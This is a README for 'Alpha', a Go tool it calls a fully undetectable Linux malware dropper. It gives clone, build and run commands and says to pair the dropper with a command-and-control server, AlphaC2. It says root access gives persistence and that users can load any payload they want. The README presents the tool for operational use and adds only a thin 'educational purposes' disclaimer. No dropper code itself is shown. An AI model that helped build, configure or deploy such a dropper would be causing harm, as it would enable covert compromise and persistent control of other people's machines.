# Alpha

FUD Linux Malware Dropper

## Set-up

- Clone this repository onto your machine
- Navigate to the project folder and run :

  ```
  go get
  ```

- To build, run :

  ```
  go build -o alpha -ldflags="-s -w" alpha.go
  ```

## Usage

- Ensure you have AlphaC2 set up already
- Start the server by running the AlphaC2 script :
  
  ```
  python3 alphac2.py
  ```

- To start the dropper, run :

  ```
  ./alpha
  ```

## NOTE

- You need root privileges to achieve persistence
- Feel free to replace the payload in the C2 Server to one that you desire

## Disclaimer

This project is for educational purposes only, and I will not be \
held liable for anything you do with it !
